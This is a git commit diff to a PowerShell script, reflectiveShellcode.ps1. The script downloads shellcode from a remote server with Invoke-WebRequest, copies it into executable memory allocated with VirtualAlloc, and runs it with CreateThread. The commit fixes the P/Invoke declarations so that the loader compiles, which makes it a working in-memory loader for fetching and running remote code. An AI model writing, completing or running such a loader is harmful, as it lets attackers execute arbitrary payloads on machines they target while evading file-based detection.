d87e2894cc07182f9be484218d1628cead8a65b6
koka <kokabitsadze@gmail.com>
2024-11-21 14:58:09 +0400

    fixed some issues

--- reflectiveShellcode.ps1
+++ reflectiveShellcode.ps1
@@ -16,8 +16,13 @@ $respone = Invoke-WebRequest -uri "$server:port/shellcode" -UseBasicParsing
 $bytes = $response.Content
 
 $VirtualAlloc = @"
-[DllImport("Kernel32.dll", SetLastError=true)]
-public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
+using System;
+using System.Runtime.InteropServices;
+
+public class Kernel32 {
+    [DllImport("Kernel32.dll", SetLastError=true)]
+    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
+}
 "@
 # https://www.pinvoke.net/default.aspx/kernel32.virtualalloc
 
@@ -27,8 +32,13 @@ $Buffer = $Kernel32::VirtualAlloc([IntPtr]::Zero, $Bytes.Length, 0x3000, 0x40) #
 [System.Runtime.InteropServices.Marshal]::Copy($bytes, 0, $Buffer, $bytes.Length) # https://learn.microsoft.com/en-us/dotnet/api/system.runtime.interopservices.marshal.copy?view=net-9.0
 
 $CreateThread = @"
-[DllImport("Kernel32.dll", SetLastError=true)]
-public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);
+using System;
+using System.Runtime.InteropServices;
+
+public class Kernel32 {
+    [DllImport("Kernel32.dll", SetLastError=true)]
+    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);
+}
 "@
 # https://www.pinvoke.net/default.aspx/kernel32/CreateThread.html
 
